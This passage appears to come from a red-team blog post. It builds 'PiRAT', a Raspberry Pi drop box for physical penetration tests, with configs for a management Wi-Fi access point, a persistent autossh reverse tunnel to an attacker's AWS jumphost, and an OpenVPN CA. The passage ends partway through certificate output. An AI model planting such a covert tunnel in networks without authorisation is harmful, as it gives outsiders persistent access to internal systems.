<p>The network diagram below should give a good overview of how PiRAT will be connected within target network. Find an open network port and plug the device in. Some VoIP phones are capable of sharing the same network cable by having a spare ethernet port on the back of the phone to avoid running excessive cables.</p>
<p>




  
  
  
    <figure>
      <img class="my-0 rounded-md" src="https://dunderhay.github.io/images/physec-pirat/basic_pirat.png" alt="basic pirat" />
      
    </figure>
  

</p>
<div id="management-of-pirat" class="anchor"></div>
<h3 class="relative group">Management of PiRAT 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#management-of-pirat" aria-label="Anchor">#</a></span>        
    
</h3>
<p>Once PiRAT has booted up, it will create a wireless AP which can be connected to by the attacker. The attacker will then be able to SSH into the Raspberry Pi and probe for ports with outbound access. Once an open outbound port has been identified (such as port 443 or 53), an SSH connection to the attackers AWS jumphost host (<code>jumphost</code>) can be established and used to tunnel the VPN traffic.</p>
<p>




  
  
  
    <figure>
      <img class="my-0 rounded-md" src="https://dunderhay.github.io/images/physec-pirat/wifi_management.png" alt="wifi management" />
      
    </figure>
  

</p>
<div id="ssh-vpn-tunnel" class="anchor"></div>
<h3 class="relative group">SSH &ldquo;VPN Tunnel&rdquo; 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#ssh-vpn-tunnel" aria-label="Anchor">#</a></span>        
    
</h3>
<p>Why tunnel OpenVPN traffic through an SSH connection?</p>
<ul>
<li>If SSH is broken, we are all screwed.</li>
<li>OpenVPN configurations can be very tricky and easy to make mistakes with. SSH on the other hand is pretty straight forward.</li>
</ul>
<p>Before establishing an SSH connection to the jumphost, the bridged adapter (<code>br0</code>) and VPN adapter (<code>tap0</code>) need to be created. This can be done through the pre-existing SSH connection via the management interface (wifi connection), by running a script (<code>pirat-bridge-start.sh</code>) to bring up a bridged interface.</p>
<p>Once an SSH connection to the jumphost has been established through an open port within the target network, the bridged network can be accessed remotely as if you were phyiscally onsite. You will even receive broadcast traffic (see below), allowing you use tools like responder.</p>
<p>




  
  
  
    <figure>
      <img class="my-0 rounded-md" src="https://dunderhay.github.io/images/physec-pirat/ssh_vpn_tunnel.png" alt="ssh vpn tunnel" />
      
    </figure>
  

</p>
<div id="bridged-openvpn-configuration" class="anchor"></div>
<h3 class="relative group">Bridged OpenVPN Configuration 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#bridged-openvpn-configuration" aria-label="Anchor">#</a></span>        
    
</h3>
<p>There are many different ways to configure OpenVPN. One special use case for tap-based OpenVPN configuration is <a href="https://openvpn.net/index.php/open-source/documentation/miscellaneous/76-ethernet-bridging.html"   target="_blank">
    network bridging</a>.</p>
<p>By bridging a physical ethernet NIC with an OpenVPN-driven TAP interface at two separate locations, it is possible to logically merge both ethernet networks, as if they were a single ethernet subnet.</p>
<p>In a bridged setup, it is possible to integrate the clients into the server-side network even further. Normally, OpenVPN assigns IP addresses to its clients using the <code>server</code> command followed by the IP address range.  However, it is possible to use an <strong>external DHCP server</strong> to assign addresses to the OpenVPN clients.</p>
<p>The OpenVPN configuration described in this blog post allows the OpenVPN client to be fully and transparently integrated into the server-side network.</p>
<p><em>Side note</em>: While it is possible to achieve a similar effect using a proxy-arp configuration, a major disadvantage of using this kernel flag is that it does not turn the VPN into a single Ethernet broadcast domain. With the <code>proxy_arp_pvlan</code> flag, the OpenVPN clients can reach each other using ARP messages. However, they will not receive broadcast traffic coming from other clients.</p>
<p>




  
  
  
    <figure>
      <img class="my-0 rounded-md" src="https://dunderhay.github.io/images/physec-pirat/bridge_openvpn.png" alt="bridge openvpn" />
      
    </figure>
  

</p>
<div id="hardware-components" class="anchor"></div>
<h2 class="relative group">Hardware Components 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#hardware-components" aria-label="Anchor">#</a></span>        
    
</h2>
<ul>
<li>Raspberry Pi.</li>
<li>AWS EC2 Instance.</li>
<li>External wifi dongle for longer range (<strong>not required</strong>).<br>
If you wanted to extend the wireless range of the management AP, I would go for something like the <a href="http://www.tp-link.com/us/products/details/cat-5520_TL-WN722N.html"   target="_blank">
    TP Link TL-WN722N</a>, as a fairly cheap and reliable external wifi adapter.</li>
</ul>
<div id="the-build" class="anchor"></div>
<h2 class="relative group">The Build 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#the-build" aria-label="Anchor">#</a></span>        
    
</h2>
<div id="raspberry-pi" class="anchor"></div>
<h3 class="relative group">Raspberry Pi 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#raspberry-pi" aria-label="Anchor">#</a></span>        
    
</h3>
<div id="initial-setup" class="anchor"></div>
<h4 class="relative group">Initial Setup 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#initial-setup" aria-label="Anchor">#</a></span>        
    
</h4>
<ul>
<li>
<p>Download &amp; Flash the latest Raspberry Pi image /OS onto an SD card.</p>
</li>
<li>
<p>Boot up the Raspberry Pi and login. SSH into the rpi and replace default password-based authentication with key-based authentication. Copy over your public key from your attacker machine and place it in the <code>authorized_keys</code> file of the rpi:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ cat ~/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">ssh-ed25519 ..public-key-contents-here.. phish@attacker
</span></span></code></pre></div></li>
<li>
<p>Update &amp; upgrade the packages</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade
</span></span></code></pre></div></li>
<li>
<p>Install the required tools</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo apt install -y autossh git openvpn bridge-utils dnsmasq hostapd fail2ban
</span></span></code></pre></div></li>
<li>
<p>Change default password for the <strong>pi</strong> user:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ passwd
</span></span></code></pre></div></li>
<li>
<p>Enable SSH at boot</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo systemctl <span class="nb">enable</span> ssh
</span></span></code></pre></div></li>
<li>
<p>Remove the default Raspberry Pi host keys</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo rm /etc/ssh/ssh_host_*
</span></span></code></pre></div></li>
<li>
<p>Generate new Raspberry Pi host keys</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo dpkg-reconfigure openssh-server
</span></span></code></pre></div></li>
<li>
<p>Generate new ssh key pair for the rpi</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ ssh-keygen -t ed25519
</span></span></code></pre></div></li>
<li>
<p>Add the jumphost entry in <code>/etc/hosts</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="mf">127.0.0.1</span>         <span class="nv">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">::</span><span class="nv">1</span>               <span class="nv">localhost</span> <span class="nv">ip6-localhost</span> <span class="nv">ip6-loopback</span>
</span></span><span class="line"><span class="cl"><span class="nv">ff02</span><span class="err">::</span><span class="nv">1</span>           <span class="nv">ip6-allnodes</span>
</span></span><span class="line"><span class="cl"><span class="nv">ff02</span><span class="err">::</span><span class="nv">2</span>           <span class="nv">ip6-allrouters</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">127.0.1.1</span>         <span class="nv">raspberrypi</span>
</span></span><span class="line"><span class="cl"><span class="mf">13.210.113.204</span>    <span class="nv">jumphost</span>
</span></span></code></pre></div></li>
<li>
<p>Add the jumphost entry into ssh configuration file (<code>~/.ssh/config</code>) on the rpi</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Host vpn-tunnel
</span></span><span class="line"><span class="cl">    HostName jumphost
</span></span><span class="line"><span class="cl">    User ubuntu
</span></span><span class="line"><span class="cl">    Port <span class="m">443</span>
</span></span><span class="line"><span class="cl">    IdentityFile /home/pi/.ssh/id_ed25519
</span></span><span class="line"><span class="cl">    RemoteForward <span class="m">2020</span> localhost:2020
</span></span><span class="line"><span class="cl">    ServerAliveInterval <span class="m">30</span>
</span></span><span class="line"><span class="cl">    ServerAliveCountMax <span class="m">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host *
</span></span><span class="line"><span class="cl">    UseRoaming no
</span></span><span class="line"><span class="cl">    HashKnownHosts yes
</span></span></code></pre></div></li>
<li>
<p>It is recommended to harden the default ssh config as well&hellip; I made the following changes to the default ssh config file on the rpi:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Port <span class="m">2020</span>
</span></span><span class="line"><span class="cl">AddressFamily inet
</span></span><span class="line"><span class="cl">Protocol <span class="m">2</span>
</span></span><span class="line"><span class="cl">AllowAgentForwarding no
</span></span><span class="line"><span class="cl">X11Forwarding no
</span></span><span class="line"><span class="cl">PermitRootLogin no
</span></span><span class="line"><span class="cl">PasswordAuthentication no
</span></span></code></pre></div></li>
<li>
<p>Additional hardening -&gt; configure fail2ban</p>
</li>
</ul>
<div id="management-interface-config" class="anchor"></div>
<h4 class="relative group">Management Interface Config 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#management-interface-config" aria-label="Anchor">#</a></span>        
    
</h4>
<p>The management interface will be used to manage the rpi. Once connected to the device over the management interface, you will be able to check the ssh tunnel has been established or change anything needed in order for the device to dig out of the target&rsquo;s network.</p>
<p>We setup a wifi access point using the <code>wlan0</code> interface of the rpi for managing the remote access box.</p>
<ul>
<li>
<p>Create a <code>/etc/hostapd/hostapd.conf</code> file - modify the <code>ssid</code>, and <code>wpa_passphrase</code> as needed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="c"># Interface configuration
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">interface</span><span class="o">=</span><span class="nv">wlan0</span>
</span></span><span class="line"><span class="cl"><span class="nv">ssid</span><span class="o">=</span><span class="nv">pirat</span>
</span></span><span class="line"><span class="cl"><span class="nv">channel</span><span class="o">=</span><span class="nv">11</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># WPA configuration
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">macaddr_acl</span><span class="o">=</span><span class="nv">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">auth_algs</span><span class="o">=</span><span class="nv">3</span>
</span></span><span class="line"><span class="cl"><span class="nv">ignore_broadcast_ssid</span><span class="o">=</span><span class="nv">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">wpa</span><span class="o">=</span><span class="nv">3</span>
</span></span><span class="line"><span class="cl"><span class="nv">wpa_passphrase</span><span class="o">=</span><span class="nv">doyouevenpirat</span>
</span></span><span class="line"><span class="cl"><span class="nv">wpa_key_mgmt</span><span class="o">=</span><span class="nv">WPA-PSK</span>
</span></span><span class="line"><span class="cl"><span class="nv">wpa_pairwise</span><span class="o">=</span><span class="nv">CCMP</span> <span class="nv">TKIP</span>
</span></span><span class="line"><span class="cl"><span class="nv">rsn_pairwise</span><span class="o">=</span><span class="nv">CCMP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Hardware configuration
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">driver</span><span class="o">=</span><span class="nv">nl80211</span>
</span></span><span class="line"><span class="cl"><span class="nv">ieee80211n</span><span class="o">=</span><span class="nv">1</span>
</span></span><span class="line"><span class="cl"><span class="nv">hw_mode</span><span class="o">=</span><span class="nv">g</span>
</span></span></code></pre></div></li>
<li>
<p>Modify the <code>DAEMON_CONF</code> value in the host access point daemon (<code>/etc/init.d/hostapd</code>) file.</p>
<pre tabindex="0"><code>DAEMON_CONF=/etc/hostapd/hostapd.conf
</code></pre></li>
<li>
<p>Configure DHCP server on the <code>wlan0</code> interface by adding the following to the <code>/etc/dnsmasq.conf</code> configuration file.</p>
<p>The range specified below will hand out IP addresses in the <code>172.16.66.50-172.16.66.100</code> range - feel free to change this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="c"># Interface to bind to
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">interface</span><span class="o">=</span><span class="nv">wlan0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">bind-interfaces</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Specify starting_range,end_range,lease_time
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">dhcp-range</span><span class="o">=</span><span class="mf">172.16.66.50</span><span class="p">,</span><span class="mf">172.16.66.100</span><span class="p">,</span><span class="mf">255.255.255.0</span><span class="p">,</span><span class="nv">12h</span>
</span></span></code></pre></div></li>
<li>
<p>Set a static IP address on the <code>wlan0</code> interface by adding the following to <code>/etc/network/interfaces</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="nv">auto</span> <span class="nv">eth0</span>
</span></span><span class="line"><span class="cl"><span class="nv">iface</span> <span class="nv">eth0</span> <span class="nv">inet</span> <span class="nv">dhcp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">auto</span> <span class="nv">wlan0</span>
</span></span><span class="line"><span class="cl"><span class="k">allow</span><span class="nv">-hotplug</span> <span class="nv">wlan0</span>
</span></span><span class="line"><span class="cl"><span class="nv">iface</span> <span class="nv">wlan0</span> <span class="nv">inet</span> <span class="kc">static</span>
</span></span><span class="line"><span class="cl"><span class="nv">address</span> <span class="mf">172.16.66.1</span>
</span></span><span class="line"><span class="cl"><span class="kt">netmask</span> <span class="mf">255.255.255.0</span>
</span></span></code></pre></div></li>
<li>
<p>In newer versions of Raspian / Raspberry Pi OS, the interface configuration is handled by dhcpcd by default. We need to tell it to ignore the <code>wlan0</code> interface.</p>
<p>Add the following line to the dhcpcd configuration file (<code>/etc/dhcpcd.conf</code>). <strong>Note</strong>: This must be <strong>ABOVE</strong> any interface lines you may have added.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="nv">denyinterfaces</span> <span class="nv">wlan0</span>
</span></span></code></pre></div></li>
<li>
<p>Enable hostapd to start on boot.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ update-rc.d hostapd <span class="nb">enable</span>
</span></span></code></pre></div></li>
<li>
<p>Enable dnsmasq to start on boot. (<a href="https://www.blackhillsinfosec.com/how-to-build-your-own-penetration-testing-drop-box/"   target="_blank">
    A BlackHills blog post</a> mentioned that they had issues using <code>update-rc.d dnsmasq enable</code> here because dnsmasq was starting before the interface (in our case <code>wlan0</code>) was up and failing to bind to the interface. Instead I found adding <code>service dnsmasq start</code> to <code>/etc/rc.local</code> works.</p>
<p>The content of <code>/etc/rc.local</code> should now look like something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># By default this script does nothing.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Print the IP address</span>
</span></span><span class="line"><span class="cl"><span class="nv">_IP</span><span class="o">=</span><span class="k">$(</span>hostname -I<span class="k">)</span> <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$_IP</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">  <span class="nb">printf</span> <span class="s2">&#34;My IP address is %s\n&#34;</span> <span class="s2">&#34;</span><span class="nv">$_IP</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">service dnsmasq start
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span></code></pre></div></li>
</ul>
<div id="ssh-tunnel-config" class="anchor"></div>
<h4 class="relative group">SSH Tunnel Config 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#ssh-tunnel-config" aria-label="Anchor">#</a></span>        
    
</h4>
<p>Next we need to configure the SSH tunnel that will be used for the VPN traffic.</p>
<ul>
<li>
<p>Create a systemd service unit file (<code>/etc/systemd/system/autossh-vpn-tunnel.service</code>) to start create the ssh tunnel to the jumphost using <code>autossh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="err">[</span><span class="nv">Unit</span><span class="err">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span><span class="nv">Establish</span> <span class="nv">a</span> <span class="err">&#39;</span><span class="nv">vpn</span><span class="err">&#39;</span> <span class="nv">ssh</span> <span class="nv">tunnel</span> <span class="nv">to</span> <span class="nv">jumphost.</span> <span class="nv">Local</span> <span class="nv">port</span> <span class="nv">2020</span> <span class="nv">is</span> <span class="nv">forwarded</span> <span class="nv">to</span> <span class="nv">remote</span> <span class="nv">port</span> <span class="nv">2020.</span>
</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span><span class="nv">network.target</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nv">Service</span><span class="err">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Environment</span><span class="o">=</span><span class="s">&#34;AUTOSSH_GATETIME=0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span><span class="err">/</span><span class="nv">usr</span><span class="err">/</span><span class="nv">bin</span><span class="err">/</span><span class="nv">autossh</span> <span class="nv">-M</span> <span class="nv">0</span> <span class="nv">-o</span> <span class="s">&#34;ServerAliveInterval 30&#34;</span> <span class="nv">-o</span> <span class="s">&#34;ServerAliveCountMax 3&#34;</span> <span class="nv">-N</span> <span class="nv">-R</span> <span class="nv">2020</span><span class="err">:</span><span class="nv">localhost</span><span class="err">:</span><span class="nv">2020</span> <span class="nv">vpn-tunnel</span>
</span></span><span class="line"><span class="cl"><span class="nv">User</span><span class="o">=</span><span class="nv">ubuntu</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nv">Install</span><span class="err">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span><span class="nv">multi-user.target</span>
</span></span></code></pre></div></li>
<li>
<p>Now we can manually start the ssh tunnel or enable the systemd service to start at boot (replace <code>start</code> with <code>enable</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ sudo systemctl start autossh-vpn-tunnel.service
</span></span></code></pre></div></li>
</ul>
<div id="openvpn-setup" class="anchor"></div>
<h4 class="relative group">OpenVPN Setup 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#openvpn-setup" aria-label="Anchor">#</a></span>        
    
</h4>
<p>The rpi is going to be our vpn server. Since OpenVPN is a ssl/tls vpn, it utilizes certificates to encrypt traffic between the server and clients. In order to issue trusted certificates, we will need to set up our own simple <em>certificate authority (CA)</em>.</p>
<ul>
<li>
<p>Download the easy-rsa repository into <code>/opt/</code>. The latest easy-rsa repo can be found <a href="https://github.com/OpenVPN/easy-rsa"   target="_blank">
    here</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ <span class="nb">cd</span> /opt/ <span class="o">&amp;&amp;</span> sudo git clone https://github.com/OpenVPN/easy-rsa
</span></span></code></pre></div><p>We need to copy the easy-rsa template directory from <code>/opt/easy-rsa/easy/</code> into our Raspberry Pi users home directory.</p>
</li>
<li>
<p>Make a new directory for our OpenVPN Certificate Authority (CA) using the <code>make-cadir</code> command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ make-cadir ~/openvpn-ca
</span></span></code></pre></div></li>
<li>
<p>Copy the easy-rsa template directory from <code>/opt/easy-rsa/easy/</code> into <code>~/.openvpn-ca/</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~ $ cp -R /opt/easy-rsa/easyrsa3/* ~/openvpn-ca/
</span></span></code></pre></div><p>Once this folder has been copied, It is recommended that you set the Easy-RSA working directory within the <code>vars</code> file. Change the <code>EASYRSA</code> variable to something sensible for your environment, for example as <code>/usr/share/easy-rsa</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">EASY_RSA</span><span class="o">=</span><span class="s2">&#34;/usr/share/easy-rsa&#34;</span>
</span></span></code></pre></div></li>
<li>
<p>Change the <code>KEY_CONFIG</code> variable to point to the <code>openssl-1.0.0.cnf</code> file. (Note - this is likely to become outdated in the future and you should modify the openssl config to whatever the latest release is)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KEY_CONFIG</span><span class="o">=</span><span class="s2">&#34;/usr/share/easy-rsa/openssl-1.0.0.cnf&#34;</span>
</span></span></code></pre></div></li>
<li>
<p>Configure the remaining CA variables:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-conf" data-lang="conf"><span class="line"><span class="cl"><span class="c"># These are the default values for fields
</span></span></span><span class="line"><span class="cl"><span class="c"># which will be placed in the certificate.
</span></span></span><span class="line"><span class="cl"><span class="c"># Don&#39;t leave any of these fields blank.
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">export</span> <span class="nv">KEY_COUNTRY</span><span class="o">=</span><span class="s">&#34;US&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">export</span> <span class="nv">KEY_PROVINCE</span><span class="o">=</span><span class="s">&#34;CA&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">export</span> <span class="nv">KEY_CITY</span><span class="o">=</span><span class="s">&#34;SanFrancisco&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">export</span> <span class="nv">KEY_ORG</span><span class="o">=</span><span class="s">&#34;Fort-Funston&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">export</span> <span class="nv">KEY_EMAIL</span><span class="o">=</span><span class="s">&#34;me@myhost.mydomain&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">export</span> <span class="nv">KEY_OU</span><span class="o">=</span><span class="s">&#34;MyOrganizationalUnit&#34;</span>
</span></span></code></pre></div></li>
<li>
<p>We will also edit the <code>KEY_NAME</code> value which populates the subject field. To keep this simple, we&rsquo;ll call it <code>server</code> in this guide:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KEY_NAME</span><span class="o">=</span><span class="s2">&#34;server&#34;</span>
</span></span></code></pre></div></li>
<li>
<p>Initialise Easy-RSA PKI:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca $ ./easyrsa init-pki
</span></span></code></pre></div></li>
<li>
<p>Build the CA with the <code>./easyrsa build-ca</code> command and follow the prompts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca $ ./easyrsa build-ca
</span></span><span class="line"><span class="cl">NOTE: If you run ./clean-all, I will be doing a rm -rf on /usr/share/easy-rsa/keys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Note: using Easy-RSA configuration from: ./vars
</span></span><span class="line"><span class="cl">Generating a <span class="m">2048</span> bit RSA private key
</span></span><span class="line"><span class="cl">..
</span></span><span class="line"><span class="cl">writing new private key to <span class="s1">&#39;/home/pi/openvpn-ca/pki/private/ca.key.5Qv62XciYX&#39;</span>
</span></span><span class="line"><span class="cl">Enter PEM pass phrase:
</span></span><span class="line"><span class="cl">Verifying - Enter PEM pass phrase:
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">Common Name <span class="o">(</span>eg: your user, host, or server name<span class="o">)</span> <span class="o">[</span>Easy-RSA CA<span class="o">]</span>:pi_rat
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CA creation <span class="nb">complete</span> and you may now import and sign cert requests.
</span></span><span class="line"><span class="cl">Your new CA certificate file <span class="k">for</span> publishing is at:
</span></span><span class="line"><span class="cl">/home/pi/openvpn-ca/pki/ca.crt
</span></span></code></pre></div></li>
</ul>
<div id="generating-openvpn-certificates" class="anchor"></div>
<h4 class="relative group">Generating OpenVPN Certificates 
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#generating-openvpn-certificates" aria-label="Anchor">#</a></span>        
    
</h4>
<p>OpenVPN can make use of the x509 key usage parameters, ensuring clients connect
with valid client certificates, and the clients can ensure a server is authorized to be
a server. This prevents one of your client certificates from being used as a server
in a Man-In-The-Middle (MITM) attack. Without this constraint, it is possible for
any certificate signed by the VPN CA to be used to impersonate a client or server.
Because the rogue certificate resides within the same PKI, the certificate itself is still
valid, and will pass the generic PKI checks.</p>
<p><strong>Server Certificates</strong></p>
<ul>
<li>
<p>Easy-RSA supports signing certificates with the server key usage parameter using the <code>build-server-full</code> subcommand:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pi@raspberrypi:~/openvpn-ca $ ./easyrsa build-server-full pirat-server
</span></span><span class="line"><span class="cl">NOTE: If you run ./clean-all, I will be doing a rm -rf on /usr/share/easy-rsa/keys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Note: using Easy-RSA configuration from: ./vars
</span></span><span class="line"><span class="cl">Generating a <span class="m">2048</span> bit RSA private key
</span></span><span class="line"><span class="cl">...................................+++
</span></span><span class="line"><span class="cl">writing new private key to <span class="s1">&#39;/home/pi/openvpn-ca/pki/private/pirat-server.key.UjNrJ0PW2n&#39;</span>
</span></span><span class="line"><span class="cl">Enter PEM pass phrase:
</span></span><span class="line"><span class="cl">Verifying - Enter PEM pass phrase:
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">Using configuration from ./openssl-easyrsa.cnf
</span></span><span class="line"><span class="cl">Enter pass phrase <span class="k">for</span> /home/pi/openvpn-ca/pki/private/ca.key:
</span></span><span class="line"><span class="cl">Check that the request matches the signature
</span></span><span class="line"><span class="cl">Signature ok
</span></span><span class="line"><span class="cl">The Subject<span class="s1">&#39;s Distinguished Name is as follows
</span></span></span><span class="line"><span class="cl"><span class="s1">commonName            :ASN.1 12:&#39;</span>pirat-server<span class="err">&#39;</span>
